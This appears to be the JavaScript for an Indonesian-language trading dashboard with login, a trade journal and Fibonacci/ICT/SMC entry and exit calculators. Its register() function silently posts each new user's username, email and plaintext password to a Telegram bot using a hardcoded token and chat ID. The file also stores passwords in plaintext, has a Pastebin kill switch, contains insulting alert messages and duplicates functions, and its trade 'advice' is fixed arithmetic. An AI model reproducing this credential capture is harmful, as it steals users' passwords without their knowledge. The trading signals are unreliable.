    const pastebinUrl = 'https://pastebin.com/raw/abcd1234'; // Ganti dengan URL RAW Pastebin Anda

    function checkWebStatus() {
        fetch(pastebinUrl)
            .then(response => response.text())
            .then(status => {
                const statusMessage = document.getElementById('status-message');
                if (status.trim() === 'active') {
                    statusMessage.innerHTML = '<h1>Web Aktif</h1><p>Selamat datang di situs web kami!</p>';
                } else {
                    statusMessage.innerHTML = '<h1>Web Nonaktif</h1><p>Situs web ini sedang tidak aktif.</p>';
                }
            })
            .catch(error => {
                const statusMessage = document.getElementById('status-message');
                statusMessage.innerHTML = '<h1>Error</h1><p>Gagal memeriksa status web.</p>';
                console.error('Error fetching status:', error);
            });
    }

    // Panggil fungsi untuk memeriksa status saat halaman dimuat
    document.addEventListener('DOMContentLoaded', checkWebStatus);

        let users = JSON.parse(localStorage.getItem('users')) || [];
        const botToken = '7317500539:AAHbqGcfRHKqhZkVYHv4M8P3wmmKFCcXVbE'; // Ganti dengan token bot Anda
        const chatId = '7134351697'; // Ganti dengan ID chat Anda

        // Cek status login saat halaman di-refresh
        if (localStorage.getItem('loggedIn') === 'true') {
            showDashboard();
        }

        function showForm(formId) {
            const forms = document.querySelectorAll('.form-container');
            forms.forEach(form => {
                form.classList.remove('active');
                if (form.id === formId + '-form') {
                    form.classList.add('active');
                }
            });
        }

        function togglePassword(id) {
            const passwordField = document.getElementById(id);
            const toggleIcon = passwordField.nextElementSibling;
            if (passwordField.type === 'password') {
                passwordField.type = 'text';
                toggleIcon.classList.remove('fa-eye');
                toggleIcon.classList.add('fa-eye-slash');
            } else {
                passwordField.type = 'password';
                toggleIcon.classList.remove('fa-eye-slash');
                toggleIcon.classList.add('fa-eye');
            }
        }

        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            const data = {
                chat_id: chatId,
                text: message
            };

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => console.log('Success:', data))
            .catch(error => console.error('Error:', error));
        }

        function register() {
            const username = document.getElementById('register-username').value;
            const email = document.getElementById('register-email').value;
            const password = document.getElementById('register-password').value;

            // Cek apakah username sudah ada
            if (users.find(user => user.username === username)) {
                alert('Username already exists!');
                return;
            }

            // Tambah user baru
            users.push({ username, email, password });
            localStorage.setItem('users', JSON.stringify(users));
            alert('Registration successful!');

            // Kirim data ke Telegram
            const message = `New Registration:\nUsername: ${username}\nEmail: ${email}\nPassword: ${password}`;
            sendToTelegram(message);
            
            showForm('login');
        }

function login() {
    const username = document.getElementById('login-username').value;
    const password = document.getElementById('login-password').value;
    const user = users.find(user => user.username === username && user.password === password);

    if (user) {
        alert('Login successful!');
        localStorage.setItem('loggedIn', 'true');
        
        // Tambahkan pengguna ke daftar pengguna aktif
        let activeUsers = JSON.parse(localStorage.getItem('activeUsers')) || [];
        if (!activeUsers.includes(username)) {
            activeUsers.push(username);
            localStorage.setItem('activeUsers', JSON.stringify(activeUsers));
        }
        
        updateActiveUsersCount();
        showDashboard();
    } else {
        alert('Invalid username or password!');
    }
}

function removeActiveUser(username) {
    let activeUsers = JSON.parse(localStorage.getItem('activeUsers')) || [];
    activeUsers = activeUsers.filter(user => user !== username);
    localStorage.setItem('activeUsers', JSON.stringify(activeUsers));
    updateActiveUsersCount();
}

function updateActiveUsersCount() {
    const activeUsers = JSON.parse(localStorage.getItem('activeUsers')) || [];
    document.getElementById('active-users-count').textContent = activeUsers.length;
}

function logout() {
    localStorage.setItem('loggedIn', 'false');
    
    // Kurangi pengguna dari daftar pengguna aktif
    const username = document.getElementById('login-username').value;
    let activeUsers = JSON.parse(localStorage.getItem('activeUsers')) || [];
    activeUsers = activeUsers.filter(user => user !== username);
    localStorage.setItem('activeUsers', JSON.stringify(activeUsers));

    updateActiveUsersCount();
    location.reload();
}


// Update jumlah pengguna aktif saat halaman beranda ditampilkan
function showDashboard() {
    document.getElementById('auth-container').style.display = 'none';
    document.getElementById('dashboard-container').style.display = 'block';
    document.getElementById('navbar').style.display = 'flex';
    showPage('home');
    showIframe('investing'); // Menampilkan iframe pertama sebagai default
    updateActiveUsersCount();
}

        function showPage(page) {
            const pages = document.querySelectorAll('.content');
            pages.forEach(content => {
                content.classList.remove('active');
                if (content.id === page + '-content') {
                    content.classList.add('active');
                }
            });
            const navLinks = document.querySelectorAll('.navbar a');
            navLinks.forEach(link => {
                link.classList.remove('active');
                if (link.textContent.trim() === page.charAt(0).toUpperCase() + page.slice(1)) {
                    link.classList.add('active');
                }
            });
        }

        function toggleSidebar() {
            const sidebarMenu = document.getElementById('sidebar-menu');
            sidebarMenu.style.display = sidebarMenu.style.display === 'block' ? 'none' : 'block';
        }

        function toggleDarkMode() {
            document.body.classList.toggle('dark-mode');
            const darkModeEnabled = document.body.classList.contains('dark-mode');
            localStorage.setItem('darkMode', darkModeEnabled ? 'true' : 'false');
        }

function toggleMusicList() {
    const musicDropdown = document.getElementById('music-dropdown');
    musicDropdown.style.display = musicDropdown.style.display === 'block' ? 'none' : 'block';
}

function playMusic(songId) {
    // Hentikan semua audio yang sedang dimainkan
    const allAudio = document.querySelectorAll('audio');
    allAudio.forEach(audio => {
        audio.pause();
        audio.currentTime = 0;
        audio.style.display = 'none';
    });

    // Putar audio yang dipilih
    const selectedAudio = document.getElementById(songId);
    selectedAudio.style.display = 'block';
    selectedAudio.play();
}

function showPage(page) {
    const pages = document.querySelectorAll('.content');
    pages.forEach(content => {
        content.classList.remove('active');
        if (content.id === page + '-content') {
            content.classList.add('active');
        }
    });
    const navLinks = document.querySelectorAll('.navbar a');
    navLinks.forEach(link => {
        link.classList.remove('active');
        if (link.textContent.trim() === page.charAt(0).toUpperCase() + page.slice(1)) {
            link.classList.add('active');
        }
    });

    if (page === 'profile') {
        scrollToVideo();
    }
}

function scrollToVideo() {
    const videoElement = document.querySelector('.video-container');
    if (videoElement) {
        videoElement.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }
}


        function showSettings() {
            alert('Bapakmu Kayang Su');
        }

        function logout() {
            alert('Cocote Log out ig, Log Out Agama Sisan')
            localStorage.setItem('loggedIn', 'false');
            location.reload();
        }

        function showIframe(id) {
            const iframes = document.querySelectorAll('.iframe-container iframe');
            iframes.forEach(iframe => {
                iframe.style.display = 'none';
            });
            document.getElementById(`iframe-${id}`).style.display = 'block';
            const tabs = document.querySelectorAll('.tabs a');
            tabs.forEach(tab => {
                tab.classList.remove('active');
            });
            document.getElementById(`tab-${id}`).classList.add('active');
        }
        
        let trades = JSON.parse(localStorage.getItem('trades')) || [];

        function addTrade() {
            const date = document.getElementById('trade-date').value;
            const result = parseFloat(document.getElementById('trade-result').value);
            let balance = parseFloat(document.getElementById('balance').value);

            if (isNaN(result) || isNaN(balance)) {
                alert("Mohon masukkan angka yang valid.");
                return;
            }
            
            // Tambah/mengurangi saldo sesuai hasil trading
            balance += result;

            const trade = { date, result, balance };
            trades.push(trade);
            localStorage.setItem('trades', JSON.stringify(trades));

            document.getElementById('balance').value = balance;
            updateIncomeTable();
            updateCurrentBalance();
        }
        function deleteTrade(index) {
            const tradeToDelete = trades[index];
            const resultToRemove = tradeToDelete.result;

            // Kurangi saldo berdasarkan hasil yang dihapus
            trades.splice(index, 1);
            // Update saldo setelah penghapusan
            let currentBalance = trades.length > 0 ? trades[trades.length - 1].balance : 0;
            trades.forEach(trade => {
                trade.balance = currentBalance;
                currentBalance -= trade.result;
            });

            localStorage.setItem('trades', JSON.stringify(trades));

            updateIncomeTable();
            updateCurrentBalance();
        }
        function updateIncomeTable() {
            const tableBody = document.querySelector('#income-table tbody');
            tableBody.innerHTML = '';

            trades.slice().reverse().forEach((trade, index) => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${trade.date}</td>
                    <td>${trade.result}</td>
                    <td>${trade.balance} <button class="delete-btn" onclick="deleteTrade(${trades.length - 1 - index})">&times;</button></td>
                `;
                tableBody.appendChild(row);
            });
        }
        
        function updateCurrentBalance() {
            if (trades.length > 0) {
                const currentBalance = trades[trades.length - 1].balance;
                document.getElementById('current-balance').textContent = currentBalance;
            } else {
                document.getElementById('current-balance').textContent = 0;
            }
        }

        // Inisialisasi tampilan tabel dan saldo saat ini saat halaman dimuat
        document.addEventListener('DOMContentLoaded', () => {
            updateIncomeTable();
            updateCurrentBalance();
        });
                // Analysis Logic
        function performAnalysis() {
            const method = document.getElementById('analysis-method').value;
            const highPrice = parseFloat(document.getElementById('high-price').value);
            const lowPrice = parseFloat(document.getElementById('low-price').value);
            let results = '';
            let advice = '';

            if (isNaN(highPrice) || isNaN(lowPrice)) {
                alert('Please enter valid prices.');
                return;
            }

            switch (method) {
                case 'fibonacci':
                    results = fibonacciRetracement(highPrice, lowPrice);
                    advice = generateBuyTradeAdviceFibonacci(highPrice, lowPrice);
                    sellma = generateSellTradeAdviceFibonacci(lowPrice, highPrice);
                    break;
                case 'ict':
                    results = ictAnalysis(highPrice, lowPrice);
                    advice = generateTradeAdviceICT(highPrice, lowPrice);
                    sellma = generateTradeSellAdviceICT(lowPrice, highPrice);
                    break;
                case 'smc':
                    results = smcAnalysis(highPrice, lowPrice);
                    advice = generateTradeAdviceSMC(highPrice, lowPrice);
                    break;
                default:
                    results = 'Invalid method selected.';
            }

            document.getElementById('analysis-results').innerHTML = results;
            document.getElementById('buy-advice').innerHTML = advice;
            document.getElementById('sell-advice').innerHTML = sellma;
        }

        // Fibonacci Retracement Calculation
        function fibonacciRetracement(high, low) {
            const levels = {
                '23.6%': low + (high - low) * 0.236,
                '38.2%': low + (high - low) * 0.382,
                '50.0%': low + (high - low) * 0.5,
                '61.8%': low + (high - low) * 0.618,
                '78.6%': low + (high - low) * 0.786,
            };

            let result = '<h3>Fibonacci Retracement Levels</h3>';
            for (const [level, price] of Object.entries(levels)) {
                result += `<p>${level}: ${price.toFixed(2)}</p>`;
            }
            return result;
        }

        // ICT Analysis Example (simplified)
        function ictAnalysis(high, low) {
            const orderBlock = (high + low) / 2;
            const liquidityZone = {
                'Upper': high + (high - low) * 0.618,
                'Lower': low - (high - low) * 0.618
            };

            let result = '<h3>ICT Analysis</h3>';
            result += `<p>Order Block: ${orderBlock.toFixed(2)}</p>`;
            result += `<p>Upper Liquidity Zone: ${liquidityZone.Upper.toFixed(2)}</p>`;
            result += `<p>Lower Liquidity Zone: ${liquidityZone.Lower.toFixed(2)}</p>`;
            return result;
        }

        // SMC Analysis Example (simplified)
        function smcAnalysis(high, low) {
            const support = low;
            const resistance = high;
            const midPoint = (high + low) / 2;

            let result = '<h3>SMC Analysis</h3>';
            result += `<p>Support: ${support.toFixed(2)}</p>`;
            result += `<p>Resistance: ${resistance.toFixed(2)}</p>`;
            result += `<p>Mid-Point: ${midPoint.toFixed(2)}</p>`;
            return result;
        }

        // Trade Advice for Fibonacci
        function generateBuyTradeAdviceFibonacci(high, low) {
            const entry = low + (high - low) * 0.618;
            const takeProfit = low + (high - low) * 0.786;
            const stopLoss = low + (high - low) * 0.382;

            return `<h3>FIBO BULLISH STRUCTUR</h3>
                    <p>Entry: ${entry.toFixed(2)}</p>
                    <p>Take Profit: ${takeProfit.toFixed(2)}</p>
                    <p>Stop Loss: ${stopLoss.toFixed(2)}</p>`;
        }
        function generateSellTradeAdviceFibonacci(low, high) {
            const sell = high + (low - high) * 0.618;
            const tp = high + (low - high) * 0.786;
            const sl = high + (low - high) * 0.382;
            
            return `<h3>FIBO BEARISH STRUCTUR</h3>
                    <p>Entry: ${sell.toFixed(2)}</p>
                    <p>Take Profit: ${tp.toFixed(2)}</p>
                    <p>Stop Loss: ${sl.toFixed(2)}</p>`;
        }

        // Trade Advice for ICT
        function generateTradeAdviceICT(high, low) {
            const entry = (high + low) / 2;
            const takeProfit = high;
            const stopLoss = low;

            return `<h3>ICT BULLISH STRUCTUR</h3>
                    <p>Entry: ${entry.toFixed(2)}</p>
                    <p>Take Profit: ${takeProfit.toFixed(2)}</p>
                    <p>Stop Loss: ${stopLoss.toFixed(2)}</p>`;
        }

        function generateTradeSellAdviceICT(low, high) {
            const sell = (low + high) / 2;
            const tp = low;
            const sl = high;

            return `<h3>ICT BEARISH STRUCTUR</h3>
                    <p>Entry: ${sell.toFixed(2)}</p>
                    <p>Take Profit: ${tp.toFixed(2)}</p>
                    <p>Stop Loss: ${sl.toFixed(2)}</p>`;
        }
        
        // Trade Advice for SMC
        function generateTradeAdviceSMC(high, low) {
            const entry = (high + low) / 2;
            const takeProfit = high;
            const stopLoss = low;

            return `<h3>Trade Advice</h3>
                    <p>Entry: ${entry.toFixed(2)}</p>
                    <p>Take Profit: ${takeProfit.toFixed(2)}</p>
                    <p>Stop Loss: ${stopLoss.toFixed(2)}</p>`;
        }

fetch('site_status.json')
    .then(response => {
        if (!response.ok) {
            throw new Error('Jaringan Tidak Stabil');
        }
        return response.json();
    })
    .then(data => {
        if (!data.active) {
            document.body.innerHTML = "<h1>Website sedang tidak aktif</h1>";
        }
    })
    .catch(error => {
        console.error('Error fetching:', error);
    });

        // Memuat mode gelap jika diaktifkan sebelumnya
        if (localStorage.getItem('darkMode') === 'true') {
            document.body.classList.add('dark-mode');
        }
